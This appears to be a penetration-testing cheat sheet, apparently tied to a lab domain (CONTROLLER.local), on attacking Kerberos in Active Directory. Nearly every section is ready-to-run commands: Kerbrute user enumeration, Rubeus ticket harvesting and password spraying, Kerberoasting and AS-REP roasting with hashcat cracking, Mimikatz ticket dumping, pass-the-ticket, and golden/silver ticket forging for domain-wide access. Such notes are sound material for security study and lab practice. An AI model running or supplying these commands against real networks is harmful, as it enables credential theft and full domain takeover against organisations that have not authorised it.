# AD Attacking Kerberos

## <mark style="color:red;">Kerbrute</mark>

### <mark style="color:blue;">Installation</mark>

1. Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)
2. Rename kerbrute\_linux\_amd64 to kerbrute
3. `chmod +x kerbrute` - make kerbrute executable

### <mark style="color:blue;">Enumerating Users</mark>

1. cd into the directory that you put Kerbrute
2. Download the wordlist to enumerate with [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt)
3. Brute force user accounts from a domain controller using a supplied wordlist:

```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## <mark style="color:red;">Rubeus</mark>

### <mark style="color:blue;">Harvesting Tickets</mark>

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

```bash
C:\> cd Downloads #Navigate to the directory Rubeus is in
C:\> Rubeus.exe harvest /interval:30 #Tell Rubeus to harvest for TGTs every 30 seconds
```

### <mark style="color:blue;">Brute-Forcing / Password-Spraying</mark>

Rubeus can both brute force passwords as well as password spray user accounts.

```bash
C:\> cd Downloads #Navigate to the directory Rubeus is in
C:\> Rubeus.exe brute /password:Password1 /noticket #This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user
```

{% hint style="info" %}
Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
{% endhint %}

## <mark style="color:red;">Kerberoasting</mark>

### <mark style="color:blue;">Rubeus</mark>

```bash
C:\> cd Downloads #Navigate to the directory Rubeus is in
C:\> Rubeus.exe kerberoast #This will dump the Kerberos hash of any kerberoastable users
```

Copy the hash to Kali into a .txt file so it can be cracked using hashcat:

```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

### <mark style="color:blue;">Impacket</mark>

Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20

Download the precompiled package from: [https://github.com/SecureAuthCorp/impacket/releases/tag/impacket\_0\_9\_19](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket\_0\_9\_19)

```bash
cd Impacket-0.9.19 #Navigate to the impacket directory
pip install . #This will install all needed dependencies
```

```bash
cd /usr/share/doc/python3-impacket/examples/ #Navigate to where GetUserSPNs.py is located

# Dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request 

# Crack the hash using hashcat
hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash
```

## <mark style="color:red;">AS-REP Roasting</mark>

```bash
C:\> Rubeus.exe asreproast #Dumping KRBASREP5 Hashes

#Transfer the hash to Kali and put the hash into a txt file
#Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User...

#Crack those Hashes
hashcat -m 18200 hash.txt Pass.txt
```

## <mark style="color:red;">Pass the Ticket</mark>

### <mark style="color:blue;">Prepare Mimikatz & Dump Tickets</mark>

```bash
C:\> cd Downloads #Navigate to the directory mimikatz is in
C:\> mimikatz.exe #Run mimikatz
mimikatz> privilege::debug #Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
mimikatz> sekurlsa::tickets /export #This will export all of the .kirbi tickets into the directory that you are currently in
```

### <mark style="color:blue;">Pass the Ticket</mark>

Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.

```bash
#Run this command inside of mimikatz with the ticket that you harvested from earlier. 
# It will cache and impersonate the given ticket
mimikatz> kerberos::ptt <ticket> 

#Check that we successfully impersonated the ticket by listing our cached tickets.
mimikatz> klist
```

You now have impersonated the ticket giving you the same rights as the TGT you're impersonating.\


## <mark style="color:red;">Golden / Silver Ticket Attack</mark>

### <mark style="color:blue;">Dump the krbtgt hash</mark>

```bash
#Navigate to the directory mimikatz is in and run mimikatz
cd downloads && mimikatz.exe
mimikatz> privilege::debug #Ensure this outputs [privilege '20' ok]

#Dump the hash as well as the security identifier needed to create a Golden Ticket. 
#To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
mimikatz> lsadump::lsa /inject /name:krbtgt 


```

### <mark style="color:blue;">Create a Golden/Silver Ticket</mark>

Creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103:

```bash
mimikatz> kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
```

Demo:

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Use the Golden/Silver Ticket to access other machines</mark>

This will open a new elevated command prompt with the given ticket in mimikatz:

```
mimikatz> misc::cmd
```

Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
